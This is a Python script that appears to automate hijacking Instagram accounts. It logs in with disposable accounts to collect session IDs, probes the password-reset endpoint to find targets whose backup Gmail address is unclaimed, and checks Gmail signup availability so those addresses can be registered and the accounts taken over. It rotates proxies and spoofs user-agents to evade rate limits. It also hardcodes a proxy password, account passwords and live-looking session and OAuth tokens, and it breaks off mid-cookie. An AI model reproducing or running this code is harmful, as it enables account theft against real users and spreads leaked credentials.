import requests
import string
import time
import uuid, string, random
from account_posting.ig_defines import proxies
from multiprocessing import Process, Manager
from ig_scraping import get_id

# Asocks proxies
proxy = "http://f8848b9a-1092693:mrxk4ncr@89.38.99.29:29123"
proxys = {
    'http': proxy,
    'https': proxy
}

# print(requests.get('http://ipinfo.io', proxies=proxys).text)

def get_session_id(m_resps, i):
    username, password = creds[i]
    
    c ='https://www.instagram.com/accounts/login/ajax/'## The login link works only in tools and applications, it does not work in Web
    head1 = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-length': '319',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YrX_FwABAAFVRYLepbLqUSO9nyBK; ig_did=B86D9D0C-8059-4D38-AB32-62F66F91EB8A; ig_nrcb=1; shbid="6887\054479320179\0541687630562:01f72f17d27d1bf82c5011a7e21c360468f4e96ffc8c8d9bc8f3389196b275ab0b6d598c"; shbts="1656094562\054479320179\0541687630562:01f75b9e3dad31375f7599a21ee1e6b0b33b430c850ee605a7591dd83682126848a683cd"; dpr=3; datr=av-1Yj1HLbt2sRgtjJ2hIyTk; rur="ASH\054479320179\0541687707865:01f7969a9a044b6e5a39c124177ea698ce171408d797be83e4e94e6efc69642ea3b90ed9"; csrftoken=QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',#Very important cookies
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
            'viewport-width': '360',
            'x-asbd-id': '437806',
            'x-csrftoken': 'QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',
            'x-ig-app-id': '1217981644879628',
            'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
            'x-instagram-ajax': '57ac339ce6f4',
            'x-requested-with': 'XMLHttpRequest'
        }
    tim = str(time.time()).split('.')[1]##Time today but in decimal places
    data1 = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
    rq = requests.post(
        c, 
        headers=head1, 
        data=data1, 
        # proxies=proxys
    )
    print(username, rq, rq.text)
        
    if ('"userId"') in rq.text:
        co = rq.cookies
        coo =co.get_dict()
        tok = coo['sessionid']#To extract tokens print(tok)
        print(username, 'succeeded')
        m_resps[i] = tok
        # return tok

        # exit()
        # cookiee = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']}"
        # system('clear')
        # print(cookiee)
    elif ('"checkpoint_required"') in rq.text:
        print(f'plz aprove login for {username}')#secure 
    else:
        print(f'wrong password for {username}')#Wrong password or account

resets = 0
def reset_session_ids():
    with Manager() as manager:
        m_resps = manager.dict()
        proc = []
        for i in range(len(creds)):
            p = Process(target=get_session_id, args=(m_resps, i))
            proc.append(p)
            p.start()
            time.sleep(random.random()*0.5)
        for p in proc:
            p.join()
        session_ids.update(m_resps)


#### REPLACE THESE WITH NEW INSTAGRAM LOGIN CREDS AS THEY GET BANNED ####
creds = [
    ('barbaragreentrkyazltqn', 'Qhml3gHn'),
    ('robertnelsonjljgijhrll', 'DvjjqRQf7w'),
]

session_ids = dict()
#### ADD more names as Known Assassin provides more


## Step 2
def backup_email(name): ## Find their backup email. 200 if email given, 400 if couldn't reset, 429 if rate limit. We want 200s with gmail with matching first and last chars with username
    # i = random.choice(proxy_nums)
    # proxy = proxies(i)
    data = {
        "_csrftoken":
        "".join(
            random.choices(string.ascii_lowercase +
                        string.ascii_uppercase + string.digits,
                        k=32)),
        "username":
        name,
        "guid":
        uuid.uuid4(),
        "device_id":
        uuid.uuid4()
    }
    head = {
        "user-agent":
        f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)"
    }
    response = requests.post(
        "https://i.instagram.com/api/v1/accounts/send_password_reset/",
        headers=head,
        data=data,
        proxies=proxys)
    if str(response.status_code) == '429': return 429
    print(response, name, response.text)
    text = response.text
    # print(text)
    if "obfuscated_email" not in text: return False
    if "@gmail.com" not in text: return False

    email_username = text.split("@gmail.com")[0].replace(' ', '\"').split("\"")[-1]
    print(email_username)
    if (name[0] == email_username[0] and name[-1] == email_username[-1]):
        return True
    return False

## Step 3
def available_gmail(name): ## Check given name/username is available on gmail to create the gmail account
    # proxy = proxies(random.choice(proxy_nums))
    cookies = {
        '__Host-GAPS': '1:u9G0T0rTyo3Vt0MVCQWCPGwHZg1jkg:lzk1XvQz-Fy_P6bN',
        'NID': '511=a_B-kDofGjI39gYhy7cOXSQLbTJccMY1xGCuKVOdS_OwAbd9n2vwypzTQUZF04Wa4KthM58PU-x6OsvLea9PEMHSx23WPNIVvYEd9y4uYsx2hQK9CCEkKE76xfsBWR36YIvnEswvjUVIe-L1DkMmXFlmAQt5h0LnXeIRWdomNEs',
    }

    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'cookie': '__Host-GAPS=1:u9G0T0rTyo3Vt0MVCQWCPGwHZg1jkg:lzk1XvQz-Fy_P6bN; NID=511=a_B-kDofGjI39gYhy7cOXSQLbTJccMY1xGCuKVOdS_OwAbd9n2vwypzTQUZF04Wa4KthM58PU-x6OsvLea9PEMHSx23WPNIVvYEd9y4uYsx2hQK9CCEkKE76xfsBWR36YIvnEswvjUVIe-L1DkMmXFlmAQt5h0LnXeIRWdomNEs',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'x-same-domain': '1',
    }

    params = {
        'hl': 'en-GB',
        '_reqid': '51985',
        'rt': 'j',
    }

    data = f'continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&f.req=%5B%22AEThLlxPgLeF9X4pDr0D6HC7KYZgzTFnmV0-erEVDU1R4DQQ4ryr_Z218-xeOyAo7x1cg_kp4tRQF3fXIjeT9fAp3za2ceyziD5rxneyv_5R9Sp7GibBlN-vSjZwZ8GKGQuse1uTf3970ZkTn4KpYac3ri-j91WNYoAnyWjWePD1_7dTwzLY-DFHQqMw_bkmx0MSTyxBklVTJxtDrSzbRbcgdYcM_SoJpg%22%2C%22%22%2C%22%22%2C%22'
    data += f'{name}%22%2Ctrue%2C%22S269319110%3A1682447165729799%22%2C1%5D&azt=AFoagUUkPZtfm6zlIVbcze0GgJC1A6J80g%3A1682447165751&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22SG%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2Cfalse%2C1%2C%22%22%2Cnull%2Cnull%2C1%5D&gmscoreversion=undefined&'

    response = requests.post(
        'https://accounts.google.com/_/signup/webusernameavailability',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
        # proxies=proxys
    )
    text = response.text
    print(text)
    num = text[text.index("\",")+2]
    # print(num)
    if str(num) == str(1): return True

## Aggregate steps 1,2,3
def find_all_valids(m_resps, name, i): ## For a given name like ullivan, find all 2013 type accounts that we could create gmails for and claim
    potential_accounts = find_all(name, i)
    print('potential_accounts', len(potential_accounts), potential_accounts)

    def runInParallel_backup(names):
        with Manager() as manager:
            m_resps = manager.list()
            proc = []
            for name in names:
                p = Process(target=backup_email, args=(m_resps, name))
                proc.append(p)
                p.start()
            for p in proc:
                p.join()
            return list(m_resps)

    gmail_backed = runInParallel_backup(potential_accounts)
    print('gmail_backed', gmail_backed)

    def runInParallel_gmail(names):
        with Manager() as manager:
            m_resps = manager.list()
            proc = []
            for name in names:
                p = Process(target=available_gmail, args=(m_resps, name))
                proc.append(p)
                p.start()
                time.sleep(0.4)
            for p in proc:
                p.join()
            return list(m_resps)
        
    valid_accounts = runInParallel_gmail(gmail_backed)
    print(f"Valid accounts for {name}: ", valid_accounts)
    
    m_resps += valid_accounts
    return valid_accounts

## Run Aggregated steps 1,2,3 in parallel
def runInParallel(names): ## Find all valids running for many names synchronously
    reset_session_ids()
    with Manager() as manager:
        m_resps = manager.list()
        proc = []
        i = 0
        for name in names:
            p = Process(target=find_all_valids, args=(m_resps, name, i))
            proc.append(p)
            p.start()
            i = (i + 1) % len(session_ids)
            time.sleep(20 / len(session_ids))
        for p in proc:
            p.join()
        print("ALL VALID: ", list(m_resps))
        for name in list(m_resps):
            print(name)


def silly_following_test(id, start = 0, relationship = 'following'):

    cookies = {
        'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
        'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
        'ig_nrcb': '1',
        'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
        'fbm_124024574287414': 'base_domain=.instagram.com',
        'dpr': '2',
        'fbsr_124024574287414': 'LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ',
        'ds_user_id': '58603175168',
        'sessionid': '58603175168%3Asv2ODVlrx539vv%3A27%3AAYf8JTJzhpnWAB_6mTF-r7W0IWya-uBhzHcNexxxZw',
        'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'shbid': '"12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"',
        'shbts': '"1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"',
        'fbsr_124024574287414': 'LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ',
        'rur': '"NCG\\05458603175168\\0541714351058:01f77beb6261eb53c9e177ddc9665e3b2c077ba7f7995ba24e8f5d8321579562c2ae4a69"',
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': 'mid=ZBXtIQAEAAGWpHSR7XGgpHbOs4gD; ig_did=0CB4A17E-64F5-441F-9167-0E9F4EB88F5C; ig_nrcb=1; datr=IO0VZE0tGLIAMSNFMq-HKUM1; fbm_124024574287414=base_domain=.instagram.com; dpr=2; fbsr_124024574287414=LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ; ds_user_id=58603175168; sessionid=58603175168%3Asv2ODVlrx539vv%3A27%3AAYf8JTJzhpnWAB_6mTF-r7W0IWya-uBhzHcNexxxZw; csrftoken=f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0; shbid="12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"; shbts="1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"; fbsr_124024574287414=LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ; rur="NCG\\05458603175168\\0541714351058:01f77beb6261eb53c9e177ddc9665e3b2c077ba7f7995ba24e8f5d8321579562c2ae4a69"',
        'referer': 'https://www.instagram.com/throck/following/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '1792',
        'x-asbd-id': '198387',
        'x-csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3T24zTBrAocWPHWdKcr7KMSB7XrdkyqICzGYB_rpLAZJ9m',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'count': 1,
        'max_id': start,
    }

    response = requests.get(
        f'https://www.instagram.com/api/v1/friendships/{id}/{relationship}/',
        params=params,
        cookies=cookies,
        headers=headers,
    ) 
    print(response, response.text)

    # json = response.json()
    # print(json)

def silly2(id):
    cookies = {
        'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
        'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
        'ig_nrcb': '1',
        'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
        'fbm_124024574287414': 'base_domain=.instagram.com',
        'ds_user_id': '58603175168',
        'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'shbid': '"12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"',
        'shbts': '"1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"',
        'dpr': '2',
        'fbsr_124024574287414': 'EyteI8Qv5ShGHBHXTdUvahtHkaJkZqYII35XMguxOjA.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRRHVPblNYY3NJN2tSQ2lQNFdDOUVYemdrb0tYbWZ2eFhHUFRUaXVfMEJTLTdMX1RneE51bUpsczRqT0pzTjcxUXl2c3IyXzFwTmppeDgwaS1aYWNmdHZSYWpSYmhBcE9XOUNhQ25VdFpEdEZTYWloTGowdDRjR21HTi1kSnViby1lVWVaZ2IxamdPZmZ0Wk9GWmkxcVpLdk8tNVU4TG4xNTRNY2p5V2ljUjRjVjJFcmJTVVR4eVBXN1NHX2M2a1I4cjlGNDg5d1hyaHNrblB1clRWd1Y0ek5ydUU3Y0Y5UnZPdVlIaDJRZjFmLXBDMERTV3k0MUd3WWM5dGpsZzROWV8tbWMwWGphanFpU2kxeThvNWVDd2t1dzNwU25KdGRXYl9QLUc3dnMzREllWTdUbmE0Yl95OGFOUkdRcjdIcC1rQWZqend5dHI5RlQtR2MwbHJtUG43Iiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQVBhcE5vZTNzdmdWc0p4d1Y4cnhlS2RLSm9qb0JSOEV2S3IzdU5PMDJxelRmdkZ2VVN6b0FOWkNRSTRWdHZyM0JYVGxoRG5aQjBaQ3M4d1BXdmI1bDdQd2MxWG0zQm4yMGFaQXFLZTZlN1JBS1pDdTl3RXlKdlViNnlJYkhWdzIyQlRoTXVjSGIzQVpBWVpCZ2lqSXM4emdFUkpDVnFPb3QxbExqRElRUUU3YkQxYVhzWkJFakMwWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4MjgyMDMyNn0',
        'sessionid': '58603175168%3Asv2ODVlrx539vv%3A27%3AAYd7UnsXFyCst52BOa6fpnchAXo6OW1ya_p0QdwUUA',
        'fbsr_124024574287414': 'EyteI8Qv5ShGHBHXTdUvahtHkaJkZqYII35XMguxOjA.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRRHVPblNYY3NJN2tSQ2lQNFdDOUVYemdrb0tYbWZ2eFhHUFRUaXVfMEJTLTdMX1RneE51bUpsczRqT0pzTjcxUXl2c3IyXzFwTmppeDgwaS1aYWNmdHZSYWpSYmhBcE9XOUNhQ25VdFpEdEZTYWloTGowdDRjR21HTi1kSnViby1lVWVaZ2IxamdPZmZ0Wk9GWmkxcVpLdk8tNVU4TG4xNTRNY2p5V2ljUjRjVjJFcmJTVVR4eVBXN1NHX2M2a1I4cjlGNDg5d1hyaHNrblB1clRWd1Y0ek5ydUU3Y0Y5UnZPdVlIaDJRZjFmLXBDMERTV3k0MUd3WWM5dGpsZzROWV8tbWMwWGphanFpU2kxeThvNWVDd2t1dzNwU25KdGRXYl9QLUc3dnMzREllWTdUbmE0Yl95OGFOUkdRcjdIcC1rQWZqend5dHI5RlQtR2MwbHJtUG43Iiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQVBhcE5vZTNzdmdWc0p4d1Y4cnhlS2RLSm9qb0JSOEV2S3IzdU5PMDJxelRmdkZ2VVN6b0FOWkNRSTRWdHZyM0JYVGxoRG5aQjBaQ3M4d1BXdmI1bDdQd2MxWG0zQm4yMGFaQXFLZTZlN1JBS1pDdTl3RXlKdlViNnlJYkhWdzIyQlRoTXVjSGIzQVpBWVpCZ2lqSXM4emdFUkpDVnFPb3QxbExqRElRUUU3YkQxYVhzWkJFakMwWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4MjgyMDMyNn0',
        'rur': '"NCG\\05458603175168\\0541714356380:01f7786dfa41c63b8c68d52e2ee5a433447d836296e4bc4a474bf3c62402d665e8ad5b09"',
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': 'mid=ZBXtIQAEAAGWpHSR7XGgpHbOs4gD; ig_did=0CB4A17E-64F5-441F-9167-0E9F4EB88F5C; ig_nrcb=1; datr=IO0VZE0tGLIAMSNFMq-HKUM1; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=58603175168; csrftoken=f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0; shbid="12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"; shbts="1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"; dpr=2; fbsr_124024574287414=EyteI8Qv5ShGHBHXTdUvahtHkaJkZqYII35XMguxOjA.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRRHVPblNYY3NJN2tSQ2lQNFdDOUVYemdrb0tYbWZ2eFhHUFRUaXVfMEJTLTdMX1RneE51bUpsczRqT0pzTjcxUXl2c3IyXzFwTmppeDgwaS1aYWNmdHZSYWpSYmhBcE9XOUNhQ25VdFpEdEZTYWloTGowdDRjR21HTi1kSnViby1lVWVaZ2IxamdPZmZ0Wk9GWmkxcVpLdk8tNVU4TG4xNTRNY2p5V2ljUjRjVjJFcmJTVVR4eVBXN1NHX2M2a1I4cjlGNDg5d1hyaHNrblB1clRWd1Y0ek5ydUU3Y0Y5UnZPdVlIaDJRZjFmLXBDMERTV3k0MUd3WWM5dGpsZzROWV8tbWMwWGphanFpU2kxeThvNWVDd2t1dzNwU25KdGRXYl9QLUc3dnMzREllWTdUbmE0Yl95OGFOUkdRcjdIcC1rQWZqend5dHI5RlQtR2MwbHJtUG43Iiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQVBhcE5vZTNzdmdWc0p4d1Y4cnhlS2RLSm9qb0JSOEV2S3IzdU5PMDJxelRmdkZ2VVN6b0FOWkNRSTRWdHZyM0JYVGxoRG5aQjBaQ3M4d1BXdmI1bDdQd2MxWG0zQm4yMGFaQXFLZTZlN1JBS1pDdTl3RXlKdlViNnlJYkhWdzIyQlRoTXVjSGIzQVpBWVpCZ2lqSXM4emdFUkpDVnFPb3QxbExqRElRUUU3YkQxYVhzWkJFakMwWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4MjgyMDMyNn0; sessionid=58603175168%3Asv2ODVlrx539vv%3A27%3AAYd7UnsXFyCst52BOa6fpnchAXo6OW1ya_p0QdwUUA; fbsr_124024574287414=EyteI8Qv5ShGHBHXTdUvahtHkaJkZqYII35XMguxOjA.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRRHVPblNYY3NJN2tSQ2lQNFdDOUVYemdrb0tYbWZ2eFhHUFRUaXVfMEJTLTdMX1RneE51bUpsczRqT0pzTjcxUXl2c3IyXzFwTmppeDgwaS1aYWNmdHZSYWpSYmhBcE9XOUNhQ25VdFpEdEZTYWloTGowdDRjR21HTi1kSnViby1lVWVaZ2IxamdPZmZ0Wk9GWmkxcVpLdk8tNVU4TG4xNTRNY2p5V2ljUjRjVjJFcmJTVVR4eVBXN1NHX2M2a1I4cjlGNDg5d1hyaHNrblB1clRWd1Y0ek5ydUU3Y0Y5UnZPdVlIaDJRZjFmLXBDMERTV3k0MUd3WWM5dGpsZzROWV8tbWMwWGphanFpU2kxeThvNWVDd2t1dzNwU25KdGRXYl9QLUc3dnMzREllWTdUbmE0Yl95OGFOUkdRcjdIcC1rQWZqend5dHI5RlQtR2MwbHJtUG43Iiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQVBhcE5vZTNzdmdWc0p4d1Y4cnhlS2RLSm9qb0JSOEV2S3IzdU5PMDJxelRmdkZ2VVN6b0FOWkNRSTRWdHZyM0JYVGxoRG5aQjBaQ3M4d1BXdmI1bDdQd2MxWG0zQm4yMGFaQXFLZTZlN1JBS1pDdTl3RXlKdlViNnlJYkhWdzIyQlRoTXVjSGIzQVpBWVpCZ2l